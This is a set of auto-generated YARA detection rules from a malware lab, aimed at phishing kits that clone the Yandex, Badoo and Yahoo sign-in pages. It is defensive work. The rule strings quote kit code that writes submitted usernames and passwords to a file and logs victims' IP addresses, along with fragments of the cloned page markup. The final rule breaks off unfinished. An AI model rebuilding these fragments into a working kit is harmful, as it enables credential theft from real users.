

/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__yandex/phish__yandex_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__yandex
   Reference: phish__yandex phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__yandex_home_ubuntu_malware_lab_samples_extracted_phishing_Yandex_index {
   meta:
      description = "phish__yandex - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__yandex phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__yandex_home_ubuntu_malware_lab_samples_extracted_phishing_Yandex_login {
   meta:
      description = "phish__yandex - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__yandex phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "c57f5b2a2b8bcca0220b8b12a8c8d003092ed6f34a34b03f2825acd7ead99dc4"
   strings:
      $x1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['login'] . \" Pass: \" . $_POST['passwd'] . \"\\n\", FILE_APPEND);" fullword ascii /* score: '32.00'*/
      $s2 = "header('Location: https://yandex.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule _opt_mal_phish__yandex_home_ubuntu_malware_lab_samples_extracted_phishing_Yandex_login_2 {
   meta:
      description = "phish__yandex - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__yandex phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "c5b547d17a78e427c7b2774a9e25fd3a032dce725f4abe01a26e845380f37b2c"
   strings:
      $x1 = "<html data-page-type=\"auth.new\" class=\"is-js_yes passport-Page passport-Page_dark is-inlinesvg_yes\" lang=\"en\"><head><scrip" ascii /* score: '60.00'*/
      $x2 = "Ya.Rum.init({beacon:true,clck:'https://yandex.ru/clck/click',slots:[\"phone_alias_as_login_etalon\",\"new_pwd_change_exp\",\"del" ascii /* score: '52.00'*/
      $x3 = "\" href=\"https://mail.yandex.com?noretpath=1\" data-reactid=\"67\">Return to&nbsp;service</a></div><iframe class=\"passport-Dom" ascii /* score: '42.00'*/
      $x4 = "Body-h\" data-uid=\"null\" data-login=\"null\" data-passporthost=\"&quot;passport.yandex.com&quot;\" data-static-url=\"https://y" ascii /* score: '36.00'*/
      $x5 = "1-8acf-2390758893ad\">var uid = null;var login = null;var passportHost = \"passport.yandex.com\";</script><!--[if IE]><script sr" ascii /* score: '36.00'*/
      $x6 = "\" href=\"https://passport.yandex.com/registration?from=mail&amp;origin=hostroot_homer_auth_v3_com&amp;retpath=https%3A%2F%2Fmai" ascii /* score: '31.00'*/
      $x7 = "\" href=\"https://passport.yandex.com/restoration?from=mail&amp;origin=hostroot_homer_auth_v3_com&amp;retpath=https%3A%2F%2Fmail" ascii /* score: '31.00'*/
      $s8 = " 2018, <!-- /react-text --><a class=\"link link_theme_normal\" href=\"//yandex.com\" tabindex=\"0\" data-reactid=\"77\"><span cl" ascii /* score: '29.00'*/
      $s9 = "\" href=\"https://passport.yandex.com/restoration?from=mail&amp;origin=hostroot_homer_auth_v3_com&amp;retpath=https%3A%2F%2Fmail" ascii /* score: '27.00'*/
      $s10 = "ethod=\"post\" target=\"iframe\" action=\"login.php\" class=\"passport-Domik-Form\" data-reactid=\"18\"><input name=\"real_retpa" ascii /* score: '27.00'*/
      $s11 = "\" href=\"https://passport.yandex.com/registration?from=mail&amp;origin=hostroot_homer_auth_v3_com&amp;retpath=https%3A%2F%2Fmai" ascii /* score: '27.00'*/
      $s12 = "href=\"https://yastatic.net/passport-frontend/0.2.88-20/public/css/auth.new.ie.css\"/><![endif]--><script nonce=\"dbe9dfa1-da49-" ascii /* score: '27.00'*/
      $s13 = "e\" content=\"IE=EmulateIE7,IE=edge\"><link rel=\"shortcut icon\" href=\"//yastatic.net/morda-logo/i/favicon_comtr.ico\"><script" ascii /* score: '26.00'*/
      $s14 = "t/passport-frontend/0.2.88-20/public/css/auth.new.css\"><!-- <![endif]--><!--[if lt IE 9]><link rel=\"stylesheet\" type=\"text/c" ascii /* score: '25.00'*/
      $s15 = "<html data-page-type=\"auth.new\" class=\"is-js_yes passport-Page passport-Page_dark is-inlinesvg_yes\" lang=\"en\"><head><scrip" ascii /* score: '25.00'*/
      $s16 = " 2018, <!-- /react-text --><a class=\"link link_theme_normal\" href=\"//yandex.com\" tabindex=\"0\" data-reactid=\"77\"><span cl" ascii /* score: '23.00'*/
      $s17 = " href=\"https://yandex.com/support/passport/\" tabindex=\"0\" data-reactid=\"72\"><span class=\"link__inner\" data-reactid=\"73" ascii /* score: '23.00'*/
      $s18 = "43'});</script><script src=\"https://yastatic.net/nearest.js\" async=\"\" crossorigin=\"\"></script></head><body class=\"passpor" ascii /* score: '23.00'*/
      $s19 = "0.2.88-20/public/js/vendor.js\"></script><script crossorigin=\"anonymous\" src=\"https://yastatic.net/passport-frontend/0.2.88-2" ascii /* score: '22.00'*/
      $s20 = "efer=\"defer\"></script><script crossorigin=\"anonymous\" src=\"https://yastatic.net/passport-frontend/0.2.88-20/public/js/auth." ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__yandex_home_ubuntu_malware_lab_samples_extracted_phishing_Yandex_ip {
   meta:
      description = "phish__yandex - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__yandex phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s8 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s9 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s10 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s13 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__badoo/phish__badoo_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__badoo
   Reference: phish__badoo phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__badoo_home_ubuntu_malware_lab_samples_extracted_phishing_Badoo_index {
   meta:
      description = "phish__badoo - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__badoo phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__badoo_home_ubuntu_malware_lab_samples_extracted_phishing_Badoo_login {
   meta:
      description = "phish__badoo - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__badoo phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "2264bbd8a153860e1b1e03aba842f54ccd0286da2dd94ab8b4579d542dc9e1aa"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['email'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_APPEND);" ascii /* score: '29.00'*/
      $s2 = "header('Location: https://badoo.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__badoo_home_ubuntu_malware_lab_samples_extracted_phishing_Badoo_login_2 {
   meta:
      description = "phish__badoo - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__badoo phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "df4d5eec529e8d3738403fcf6654431241a2614724a7de37f7a24a22495893ae"
   strings:
      $x1 = "&nbsp;</span>Badoo </div> </div> <div class=\"footer__seo-language\"></div> </div>  <script type=\"text/javascript\"> $vars={\"r" ascii /* score: '61.00'*/
      $x2 = "<html dir=\"ltr\" class=\"js linux firefox\" lang=\"en\"><head>  <meta http-equiv=\"Content-type\" content=\"text/html;charset=u" ascii /* score: '56.00'*/
      $x3 = "<a href=\"https://badoo.com/en/signup/?f=top\" class=\"btn btn--xsm btn--white-no-border js-inside-link\"> <div class=\"btn__con" ascii /* score: '52.00'*/
      $x4 = "</script> <script id=\"base-lite\" onerror=\"handleLoadError(this)\" src=\"https://badoocdn.com/v2/-/-/js/hon_v3/base-lite.05534" ascii /* score: '42.00'*/
      $x5 = ".fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_reset .fb_dialog_legacy{overflow:vis" ascii /* score: '40.00'*/
      $x6 = "error_log_url\":\"https:\\/\\/badoo.com\\/jss\\/js_error.phtml\"}; $s.fake_start=+new Date; </script>     <title>Sign in to Bado" ascii /* score: '34.00'*/
      $x7 = "</script> <script id=\"base-lite\" onerror=\"handleLoadError(this)\" src=\"https://badoocdn.com/v2/-/-/js/hon_v3/base-lite.05534" ascii /* score: '32.00'*/
      $s8 = "ript onerror=\"handleLoadError(this)\" src=\"https://badoocdn.com/v2/-/-/js/hon_v3/unauth/page.signin.48df850c35f8630de1a3.js\" " ascii /* score: '29.00'*/
      $s9 = "ipt type=\"text/javascript\" src=\"https://badoocdn.com/facebook_sdk/cbad4cd6/en_US/sdk.js\" crossorigin=\"use-credentials\"></s" ascii /* score: '28.00'*/
      $s10 = "--sign-in js-core-events-container\">  <form method=\"post\" action=\"login.php\" class=\"no_autoloader form js-signin\" novalid" ascii /* score: '28.00'*/
      $s11 = "{min-height:32px;z-index:2;zoom:1}.fb_iframe_widget_loader .FB_Loader{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/" ascii /* score: '27.00'*/
      $s12 = "</svg></div> <div class=\"page__stream-loader js-page-loader\"></div> <div class=\"page page--simple    js-vrt-marker\" data-ab-" ascii /* score: '27.00'*/
      $s13 = ".fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-alig" ascii /* score: '27.00'*/
      $s14 = " window.onCssLoad = function() { window.loadedCSS++; } </script> <script>/* inline source: https://badoocdn.com/v2/-/-/js/hon_v3" ascii /* score: '27.00'*/
      $s15 = "nel.html\",\"sdk_url\":\"\\/\\/badoocdn.com\\/facebook_sdk\\/cbad4cd6\\/en_US\\/sdk.js\"},\"SignIn\":{\"homePageURL\":\"https:" ascii /* score: '26.00'*/
      $s16 = "up_url\":\"https:\\/\\/badoo.com\\/facebook\\/authorize.phtml?rt=9dbbde&js_use_scheme=https\",\"lookalikes_signup_url\":\"https:" ascii /* score: '26.00'*/
      $s17 = "_mobile.loading iframe{visibility:hidden}.fb_dialog_content .dialog_header{-webkit-box-shadow:white 0 1px 1px -1px inset;backgro" ascii /* score: '26.00'*/
      $s18 = "ding.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{color:#fff;display:block;padding-top:" ascii /* score: '26.00'*/
      $s19 = "oocdn.com/v2/-/-/js/hon_v3/unauth/base-app.c103cdf470828f5ba677.js\" defer=\"defer\" crossorigin=\"use-credentials\"></script>  " ascii /* score: '26.00'*/
      $s20 = ": https://badoocdn.com/v2/-/-/css/hotornot_v2/generic.critical-ltr.29f303c759f3746e209b.css */ @-webkit-keyframes loader{0%,to{-" ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__badoo_home_ubuntu_malware_lab_samples_extracted_phishing_Badoo_ip {
   meta:
      description = "phish__badoo - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__badoo phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__yahoo/phish__yahoo_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__yahoo
   Reference: phish__yahoo phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__yahoo_home_ubuntu_malware_lab_samples_extracted_phishing_Yahoo_yahoo_files_r_csc {
   meta:
      description = "phish__yahoo - file r-csc.html"
      author = "Comps Team Malware Lab"
      reference = "phish__yahoo phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "80db7842db2d4d21f8df37df52372f80135a6ba2b6233bfaff6c5e4562798c68"
   strings:
      $x1 = "(function(){var b=[\"<scr\",\"ipt type='text/javascr\",\"ipt' src='\",\"\",\"'></scr\",\"ipt>\"],z=\"lib/bc/bc_2.0.5.js\",q=\"in" ascii /* score: '37.00'*/
      $s2 = "<!-- base href=\"https://s.yimg.com/rq/darla/3-4-2/html/r-csc.html\" -->" fullword ascii /* score: '30.00'*/
      $s3 = "(function(){window.xzq_p=function(R){M=R};window.xzq_svr=function(R){J=R};function F(S){var T=document;if(T.xzq_i==null){T.xzq_i" ascii /* score: '19.00'*/
      $s4 = "myguide\\.hk|yahoo\\.com\\.(sg|tw))(\\:\\d+)?([\\/\\?]|$)/,p=w.name+\"\",s=\"darla csc writer, \",m=s+\"invalid host \",o=/^(dar" ascii /* score: '19.00'*/
      $s5 = "t\",c=\"bc.yahoo.com/\",a=c+\"/yi?\",k=c+\"/b?\",x=/^https?\\:\\/\\/([^\\/\\?]+\\.)*((yahoo|tumblr|flickr|rivals|7tennis)\\.(net" ascii /* score: '17.00'*/
      $s6 = "<meta http-equiv=\"imagetoolbar\" content=\"no\">" fullword ascii /* score: '17.00'*/
      $s7 = "<meta http-equiv=\"imagetoolbar\" content=\"false\">" fullword ascii /* score: '17.00'*/
      $s8 = "if(window.xzq_svr)xzq_svr('https://beap-bc.yahoo.com/');" fullword ascii /* score: '17.00'*/
      $s9 = "f(t){w.__h__=t;if(A){if(g[q](\"https\")==0){b[3]=\"https://s.yimg.com/lq/\"+z}else{b[3]=\"http://l.yimg.com/d/\"+z}d.write(b.joi" ascii /* score: '17.00'*/
      $s10 = "}}else{j(s+\"invalid content\")}}catch(y){j(s+\"caught err --> \"+((y&&y.message)||\"unknown\"))}}else{j(s+\"invalid context\")}" ascii /* score: '14.00'*/
      $s11 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=windows-1252\">" fullword ascii /* score: '12.00'*/
      $s12 = "_\\d+--)(.*?)/,A,v,t,f,g,i,y;function j(n){try{console.log(n)}catch(h){}}function l(C){var n=0,h,D,B,r;if(C){try{h=C.match(x);h=" ascii /* score: '12.00'*/
      $s13 = "<meta http-equiv=\"Expires\" content=\"Mon, 16 Nov 2020 00:00:01 GMT\">" fullword ascii /* score: '12.00'*/
      $s14 = "navigator.userAgent;var A=parseInt(H);var D=Q.indexOf(\"Microsoft\");var E=D!=-1&&A>=4;var I=(Q.indexOf(\"Netscape\")!=-1||Q.ind" ascii /* score: '11.00'*/
      $s15 = "<meta http-equiv=\"Cache-Control\" content=\"public\">" fullword ascii /* score: '11.00'*/
      $s16 = "window.onerror = function() { return true; };" fullword ascii /* score: '10.00'*/
      $s17 = "indow.xzq_s=function(){setTimeout(\"xzq_sr()\",1)};var J=null;var M=null;var Q=navigator.appName;var H=navigator.appVersion;var " ascii /* score: '10.00'*/
      $s18 = "</script><script language=\"javascript\">" fullword ascii /* score: '10.00'*/
      $s19 = "(\"Opera\")!=-1)&&A>=4;var O=\"undefined\";var P=2000})();" fullword ascii /* score: '9.00'*/
      $s20 = "<meta name=\"ROBOTS\" content=\"NOFOLLOW\">" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__yahoo_home_ubuntu_malware_lab_samples_extracted_phishing_Yahoo_login {
   meta:
      description = "phish__yahoo - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__yahoo phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "65b16b6cacf7818955f571a217c25031bee61cc768dec5a62a7983762d0a0eec"
   strings:
      $x1 = "<script type=\"text/x-safeframe-booted\" id=\"sf_tag_1529874865996_82\">{\"positions\":[{\"id\":\"RICH\",\"html\":\"<!-- APT Ven" ascii /* score: '67.00'*/
      $x2 = "    <style type=\"text/css\">/*! skeletor-io - v1.0.34 *//*! normalize.css v3.0.2 | MIT License | git.io/normalize */img,legend{" ascii /* score: '57.00'*/
      $x3 = "root.darlaConfig = {\"url\":\"https:\\u002F\\u002Ffc.yahoo.com\\u002Fsdarla\\u002Fphp\\u002Fclient.php?l=RICH{dest:tgtRICH;asz:f" ascii /* score: '37.00'*/
      $x4 = "dia, Format: Standard Graphical -->\\n<SCRIPT TYPE=\\\"text\\/javascript\\\" SRC=\\\"https:\\/\\/na.ads.yahoo.com\\/yax\\/banner" ascii /* score: '34.00'*/
      $x5 = "\",\"serveTime\":\"1529874865569173\",\"ep\":{\"site-attribute\":\"\",\"tgt\":\"_blank\",\"secure\":true,\"ref\":\"https:\\/\\/l" ascii /* score: '34.00'*/
      $x6 = "i=127658551&asz=1440x1024&u=https:\\/\\/login.yahoo.com\\/config\\/login&gdAdId=zzZStQrIErw-&gdUuid=Jw0P9TEwLjLwvwGKWzAHWQkiODcu" ascii /* score: '34.00'*/
      $x7 = "root.comscoreBeaconUrl = \"https:\\u002F\\u002Fsb.scorecardresearch.com\\u002Fp?c1=2&c2=7241469&c5=150002528&ns_c=UTF-8&ns__t=15" ascii /* score: '33.00'*/
      $x8 = "root.currentURL = \"\\u002Fconfig\\u002Flogin?.src=fpctx&.intl=us&.lang=en-US&.done=https%3A%2F%2Fwww.yahoo.com\";" fullword ascii /* score: '31.00'*/
      $x9 = "apple-system-headline;font-family:\"Helvetica Neue\",Helvetica,Arial;font-weight:400}body.dark-bg{background-color:#f9f9fa}.logi" ascii /* score: '31.00'*/
      $x10 = "mg.com\\/rq\\/darla\\/3-4-2\",\"sedgeRoot\":\"https:\\/\\/s.yimg.com\\/rq\\/darla\\/3-4-2\",\"version\":\"3-4-2\",\"tpbURI\":\"" ascii /* score: '31.00'*/
      $s11 = "\\/script><noscript><img width=1 height=1 alt=\\\"\\\" src=\\\"https:\\/\\/beap-bc.yahoo.com\\/yi?bv=1.0.0&bs=(135huikin(gid$Jw0" ascii /* score: '30.00'*/
      $s12 = " .login-footer,.resp .login-header{display:none}}.login-body{height:100%}.login-content{margin:0 auto;max-width:1050px;min-width" ascii /* score: '29.00'*/
      $s13 = "ported-1946.html\",\"cscPath\":\"https:\\/\\/s.yimg.com\\/rq\\/darla\\/3-4-2\\/html\\/r-csc.html\",\"root\":\"sdarla\",\"edgeRoo" ascii /* score: '29.00'*/
      $s14 = "efined\\\";var P=2000})();\\n<\\/script><script language=javascript>\\nif(window.xzq_svr)xzq_svr('https:\\/\\/beap-bc.yahoo.com" ascii /* score: '29.00'*/
      $s15 = "root.darlaConfig = {\"url\":\"https:\\u002F\\u002Ffc.yahoo.com\\u002Fsdarla\\u002Fphp\\u002Fclient.php?l=RICH{dest:tgtRICH;asz:f" ascii /* score: '29.00'*/
      $s16 = "4860955&c7=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Flogin%3F.src%3Dfpctx%26.intl%3Dus%26.lang%3Den-US&c14=-1\";" fullword ascii /* score: '28.00'*/
      $s17 = "mp;ns_c&#x3D;UTF-8&amp;ns__t&#x3D;1529874860955&amp;c7&#x3D;https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Flogin%3F.src%3Dfpctx%26.int" ascii /* score: '28.00'*/
      $s18 = "50002528&ref=https%3A%2F%2Flogin.yahoo.com%2Fconfig%2Flogin\",\"k2Rate\":1,\"positions\":{\"RICH\":{\"id\":\"RICH\",\"clean\":\"" ascii /* score: '28.00'*/
      $s19 = "hostFile\\\":\\\"https:\\\\\\/\\\\\\/s.yimg.com\\\\\\/rq\\\\\\/darla\\\\\\/3-4-2\\\\\\/js\\\\\\/g-r-min.js\\\",\\\"fdb_locale" ascii /* score: '27.00'*/
      $s20 = "arrow .login-header{text-align:center}.partner.ftr .logo,.partner.rogers-acs .logo,.partner.sbc .logo,.partner.vz-acs .logo{widt" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule _opt_mal_phish__yahoo_home_ubuntu_malware_lab_samples_extracted_phishing_Yahoo_yahoo_files_boot {
   meta:
      description = "phish__yahoo - file boot.js"
      author = "Comps Team Malware Lab"
      reference = "phish__yahoo phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "35fef72dc5ef33625492c951b321c9fe17eea19b40f320ae40be357ff91df1e8"
   strings:
      $x1 = "var DARLA,$sf,$yac;!function(){function t(t,e,r){var n=t||\"\",i=/\\-min\\.js$/gi,o=/\\.html$/gi;return n&&(e&&-1!=n[nt](xt)&&(n" ascii /* score: '61.00'*/
      $s2 = "in.js\",$t=\"http://fc.yahoo.com/sdarla/php/fc.php\",At=\"script\",_t=\"sf_auto_\"+function(){var t=new Date;return[t.getDay()," ascii /* score: '28.00'*/
      $s3 = "rn void s(541)}O=gt,E=vt,B=bt,Y=wt,J=$t,O&&0==O[tt](\"http:\")||(O=\"http://l.yimg.com/rq/darla/\"),E&&0==E[tt](\"https:\")||(E=" ascii /* score: '23.00'*/
      $s4 = "y(t,e){var r=document;t=t||0,t&&s(t),Mt||(r.open(\"text/html\",\"replace\"),r.write(\"<!-- sf err (\",t||0,\") \",e||\"\",\" -->" ascii /* score: '17.00'*/
      $s5 = "z,r}function s(t,e){try{D&&D.log&&D.logger.note(t,e)}catch(r){}}function f(t,e,r){var n,i,o;if(t||(t={}),!e||typeof e!=V||e inst" ascii /* score: '17.00'*/
      $s6 = "pt=3e4,gt=\"http://l.yimg.com/rq/darla\",vt=\"https://s.yimg.com/rq/darla\",bt=\"3-4-2\",wt=\"http://l.yimg.com/rq/darla/3-4-2/j" ascii /* score: '17.00'*/
      $s7 = "://s.yimg.com/rq/darla/\"),B&&-1!=B[nt](xt)||(B=\"2-8-4\"),J&&-1!=J[tt](\"http\")||(J=\"http://fc.yahoo.com/sdarla/php/fc.php\")" ascii /* score: '17.00'*/
      $s8 = "at=it+\"_\"+Z,ct=et+\"s\",st=\"html\",ft=\"hostFile\",ht=Z+\"File\",ut=\"msgFile\",dt=\"message\",yt=\"servicePath\",lt=\"postMe" ascii /* score: '17.00'*/
      $s9 = "boot,j=Pt&&Pt.$sf,j&&(D=j.lib,r=Mt?r?r:j.host:z),D&&(T=D.lang,x=D.dom,T&&(P=T.cstr,C=T.cnum,L=T.cbool)),Mt&&r&&(F=r.Config,N=r.P" ascii /* score: '15.00'*/
      $s10 = "tDate(),\"-\",t.getMonth(),\"-\",t.getFullYear()].join(\"\")}(),jt=\"sf_host_lib_\"+_t,Dt=/^\\s\\s*/,Tt=/\\s\\s*$/,xt=/(\\d+\\-" ascii /* score: '14.00'*/
      $s11 = "Ct.URL||location.href}catch(Ht){R=\"\"}0==R[tt](\"https:\")&&(O=E,J=J[rt](/^http\\:/i,\"https:\")),k=O+\"/\"+B,S=k+\"/\"+st,Y&&-" ascii /* score: '12.00'*/
      $s12 = "[ot]===U?U:X,f=f&&!!n&&!St,f&&(a=m(jt),a&&l(a)==At&&a.src==n&&(f=U,St=X)),f&&!St)try{i=p(\"head\")[0],a=Ct.createElement(At),a.i" ascii /* score: '12.00'*/
      $s13 = ")}else{if(s=i.id,!s)continue;if(Nt[s])continue;h=i.html||i.src||\"\",h&&\"string\"==typeof h&&(Nt[s]=1,qt[ct][s]=i,qt[ct][s].dat" ascii /* score: '11.00'*/
      $s14 = "\",K+\"-processed\")}catch(d){}if(Ft[r]=r,i=e.text||e.innerHTML||e.innerText||\"\"){try{i=i[rt](Dt,\"\")[rt](Tt,\"\");try{i=JSON" ascii /* score: '11.00'*/
      $s15 = "t&&(e=m(jt)),e&&(t=e.readyState,e[Q]?\"loaded\"!=t&&\"complete\"!=t||(r=X,e[Q]=z):(r=X,e.onload=z),r&&(e=z,c(),j&&D&&T&&x?(b=d,a" ascii /* score: '10.00'*/
      $s16 = "ment.referrer,l&&-1!=l[tt](\"http\")?(p=l[tt](\"/\",9),p=-1==p?l.length:p,l=l.substring(0,p)):l=\"\",l.length>8&&top[lt](\"noad=" ascii /* score: '10.00'*/
      $s17 = "];)if(r=e.id||\"\",r||(r=\"sf_tag_\"+(new Date).getTime()+\"_\"+Math.round(100*Math.random()),e.id=r),!Ft[r]){try{e.setAttribute" ascii /* score: '9.00'*/
      $s18 = "(Gt)):s(534)))}function w(){var t,r,n,i,a,f,u;if(!Et&&Mt)if(r=c(),u=!!F,j||(Pt.$sf=j={}),r||($sf.host=r={}),r.boot){if(x&&!Bt)tr" ascii /* score: '9.00'*/
      $s19 = "ID=r,qt.firstPos||(qt.firstPos=i),i.baseConf&&(qt[W]=f(qt[W],i.baseConf)))}}}}function o(){var t;try{Mt&&!Et&&$sf.host.boot(Gt)}" ascii /* score: '9.00'*/
      $s20 = "on p(t){return t&&Ct&&Ct.getElementsByTagName(t)||[]}function g(){var t,e,r=z,n=\"querySelectorAll\",i=0;if(kt===z)try{kt=n in d" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__yahoo_home_ubuntu_malware_lab_samples_extracted_phishing_Yahoo_yahoo_files_client {
   meta:
      description = "phish__yahoo - file client.php"
      author = "Comps Team Malware Lab"
      reference = "phish__yahoo phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "19a1735c5a8ae792682c7b6ca4b3a975f7dcb7d894390d8b01a379ac69a85b99"
   strings:
      $s1 = "loadScript( \"https://s.yimg.com/rq/darla/boot.js\", false, false);" fullword ascii /* score: '23.00'*/
      $s2 = "// get the encoded bytes" fullword ascii /* score: '21.00'*/
      $s3 = " * Load a script in HEAD" fullword ascii /* score: '19.00'*/
      $s4 = "G5Jb0oyaDBkSEJ6T2k4dlltVmhjQzFpWXk1NVlXaHZieTVqYjIwdkp5azdDbWxtS0hkcGJtUnZkeTU0ZW5GZmNDbDRlbkZmY0NnbmVXa1wvWW5ZOU1TNHdMakFtWW5NO" ascii /* score: '16.00'*/
      $s5 = "WprNE56UTROalUxTmpsZk5UTTVNRFF6TWpFeFh6TWlPd29LQ1daMWJtTjBhVzl1SUdSd1pYSW9LU0I3SUFvSkNtbG1LSGRwYm1SdmR5NTRlbkZmYzNaeUtYaDZjVjl6Z" ascii /* score: '14.00'*/
      $s6 = "FQwUmpkVTFSUVVGQlFVTmZObGc1Y0N4emRDUXhOVEk1T0RjME9EWTFOVFk1TVRjekxITnBKRFEwTmpVMU5URXNjM0FrTVRVd01EQXlOVEk0TEdOMEpESTFMSGxpZUNSS" ascii /* score: '14.00'*/
